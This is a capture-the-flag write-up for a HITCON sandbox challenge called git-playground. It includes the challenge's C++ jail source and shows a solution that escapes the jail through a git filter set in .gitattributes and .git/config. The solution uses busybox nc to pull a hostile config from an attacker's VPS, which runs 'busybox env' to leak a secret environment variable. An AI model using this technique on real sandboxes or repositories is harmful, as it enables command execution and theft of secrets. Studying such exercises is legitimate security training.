# git-playground

```
A simple git playground for you to test simple git commands.

Note that everything in the sandbox are either from public releases, distro tarballs, or built from unmodified upstream source with common toolchains under normal architectures. Nothing strange and weird here.

ssh -p 50087 root@git-playground.chal.hitconctf.com

git-playground_-f59556b3c6f4b1106c530eb98c67e0d6ece14faf.tar.gz
```

Attachment:

```cpp
// jail.cpp
#include <algorithm>
#include <cctype>
#include <cstdlib>
#include <errno.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <ranges>
#include <sstream>
#include <string>
#include <sys/wait.h>
#include <unistd.h>
#include <vector>

using namespace std;

void exec(char *const cmd[]) {
  pid_t pid;
  if ((pid = fork()) == 0) {
    execvp(cmd[0], cmd);
    perror("execution failed");
    exit(1);
  }
  int status;
  waitpid(pid, &status, 0);
}

void exec(vector<string> &args) {
  vector<char *> cmd =
      args | views::transform([](string &s) -> char * { return s.data(); }) |
      ranges::to<vector<char *>>();
  cmd.push_back(NULL);
  exec(cmd.data());
}

void init() {
  chdir("/work");
  setenv("PATH", "/bin", 1);
  setenv("SHELL", "/bin/sh", 1);
  setenv("LESS", "-Rd", 1);
  char *const git_init[] = {"git", "init", "-b", "main", NULL};
  exec(git_init);
  char *const git_config_email[] = {
      "git", "config", "--global", "user.email", "hitconctf@hitcon.com", NULL};
  exec(git_config_email);
  char *const git_config_name[] = {"git",       "config",    "--global",
                                   "user.name", "hitconctf", NULL};
  exec(git_config_name);
}

void banner() {
  cout << "=====================================\n";
  cout << "Hello! Welcome to the Git playground!\n";
  cout << "=====================================\n";
}

vector<string> parse(const string &cmd) {
  stringstream ss(cmd);
  vector<string> args;
  string tmp;
  while (ss >> tmp) {
    args.push_back(move(tmp));
  }
  return args;
}

bool blacklist(const string &cmd) {
  string lst[] = {"sh"s, "env"s, "hook"s};
  for (auto &s : lst) {
    if (cmd.find(s) != string::npos) {
      return 1;
    }
  }
  return 0;
}

bool check_printable_charset(const string &s) {
  for (char c : s) {
    if (!isprint(c)) {
      return 0;
    }
  }
  return 1;
}

bool check_basic_charset(const string &s) {
  for (char c : s) {
    if (!(isalnum(c) || c == ' ' || c == ',' || c == '.')) {
      return 0;
    }
  }
  return 1;
}

bool check_path_charset(const string &s) {
  for (char c : s) {
    if (!(isalnum(c) || c == '.' || c == '/' || c == '_' || c == '-')) {
      return 0;
    }
  }
  return 1;
}

bool check_commit(const string &s) {
  if (s == "main" || s == "HEAD") {
    return 1;
  }
  for (char c : s) {
    if (!(isdigit(c) || (c >= 'a' && c <= 'f'))) {
      return 0;
    }
  }
  return 1;
}

bool check_path_under_work(const string &s) {
  return check_path_charset(s) && s[0] != '-' &&
         filesystem::absolute(s).lexically_normal().string().starts_with(
             "/work");
}

bool check(vector<string> &args) {
  if (args[0] == "git") {
    if (args.size() == 1) {
      return 1;
    }
    if (args[1] == "add") {
      if (args.size() != 3) {
        return 0;
      }
      return check_path_under_work(args[2]);
    } else if (args[1] == "commit") {
      if (args.size() < 4 || args[2] != "-m") {
        return 0;
      }
      string comment;
      for (int i = 3; i < (int)args.size(); i++) {
        comment += move(args[i]) + " ";
      }
      comment.pop_back();
      args.erase(args.begin() + 3, args.end());
      args.push_back(move(comment));
      return check_basic_charset(comment);
    } else if (args[1] == "status") {
      return args.size() == 2;
    } else if (args[1] == "log" || args[1] == "diff") {
      return args.size() == 2 ||
             (args.size() == 3 &&
              (check_path_under_work(args[2]) || check_commit(args[2])));
    } else if (args[1] == "show") {
      return args.size() == 2 || (args.size() == 3 && check_commit(args[2]));
    }
  } else if (args[0] == "touch" || args[0] == "cat" || args[0] == "rm" ||
             args[0] == "mkdir") {
    return args.size() == 2 && check_path_under_work(args[1]);
  } else if (args[0] == "ls") {
    return args.size() == 1 ||
           (args.size() == 2 && check_path_under_work(args[1]));
  } else if (args[0] == "rmdir") {
    return args.size() == 2 && check_path_under_work(args[1]) &&
           args[1] != "/work";
  } else if (args[0] == "cp" || args[0] == "mv") {
    return args.size() == 3 && check_path_under_work(args[1]) &&
           check_path_under_work(args[2]);
  }
  return 0;
}

int main() {
  init();
  banner();
  while (true) {
    cout << "Enter your command: " << flush;
    string cmd;
    if (!getline(cin, cmd)) {
      break;
    }
    if (blacklist(cmd)) {
      cout << "Dont't try to hack me\n";
      continue;
    }
    vector<string> args = parse(cmd);
    if (args.empty()) {
      continue;
    }
    if (args[0] == "cd" && args.size() == 2 && check_path_under_work(args[1])) {
      chdir(args[1].data());
    } else if (args[0] == "pwd" && args.size() == 1) {
      cout << filesystem::current_path().lexically_relative("/work").string()
           << '\n';
    } else if (args[0] == "echo") {
      if (args.size() >= 3) {
        string write_path;
        bool overwrite = 0;
        if ((args[(int)args.size() - 2] == ">" ||
             args[(int)args.size() - 2] == ">>") &&
            check_path_under_work(args[(int)args.size() - 1])) {
          write_path = args.back();
          args.pop_back();
          if (args.back() == ">") {
            overwrite = 1;
          }
          args.pop_back();
        }
        string data;
        for (int i = 1; i < (int)args.size(); i++) {
          data += move(args[i]) + " ";
        }
        data.pop_back();
        if (!check_printable_charset(data)) {
          cout << "Invalid command\n";
        } else if (write_path.empty()) {
          cout << data << "\n";
        } else {
          ofstream ofs(write_path,
                       ios::out | (overwrite ? ios::trunc : ios::app));
          if (ofs.is_open()) {
            ofs << data << "\n";
            ofs.close();
          } else {
            cout << "Error opening file\n";
          }
        }
      }
    } else if (check(args)) {
      exec(args);
    } else {
      cout << "Invalid command\n";
    }
  }
  cout << "Bye!\n";
  return 0;
}
```

```shell
# run.sh
#!/bin/bash

# FLAG is in the environment variable

rootdir="$(mktemp -d)"
trap "{ rm -rf '$rootdir'; }" EXIT
mkdir "$rootdir/bin"
cp -a /chroot/bin "$rootdir"
mkdir "$rootdir/root"
mkdir "$rootdir/work"
mkdir "$rootdir/dev"
mknod "$rootdir/dev/null" c 1 3
chmod 666 "$rootdir/dev/null"

exec /chroot/bin/busybox sh -c "exec chroot '$rootdir' /bin/jail"
```

This is a sandbox where we cannot do many things. How to read environment variables? Steps:

1. Use .gitattrbutes + .git/config using git filter to run custom command to bypass validation
2. Pull .git/config from network to bypass `env` validation
3. Trigger git filter again to run `busybox env`

First, prepare a VPS, write a file like this:

```config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[filter "test"]
        clean = busybox env
        smudge = cat
```

This will be downloaded by the sandbox, so a public IP is required. Use nc to serve it:

```shell
# run in background in VPS
cat config | nc -l -p 2223 -v
```

Then, we download the config in the sandbox:

```shell
echo *.c filter=test > .gitattributes
echo [filter "test"] >> .git/config
echo clean = busybox nc YOUR_PUBLIC_IP_HERE 2223 > .git/config >> .git/config
echo smudge = cat >> .git/config
git add .gitattributes
touch test.c
git add .
```

The `.git/config` has been replaced by our file:

```shell
Enter your command: cat .git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[filter "test"]
        clean = busybox env
        smudge = cat
```

Now, trigger the git filter again:

```shell
touch test2.c
git add .
git diff
```

You can find the flag in output:

```diff
diff --git a/test2.c b/test2.c
index 4e43e22..af90735 100644
--- a/test2.c
+++ b/test2.c
@@ -1,17 +0,0 @@
-FLAG=hitcon{Bu5yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?}
-SSH_CONNECTION=117.133.64.11 7895 10.10.0.18 22
-PWD=/work
-SHELL=/bin/sh
-PATH=//libexec/git-core:/bin
-TERM=xterm-256color
-LOGNAME=root
-GIT_PREFIX=
```

Solved.
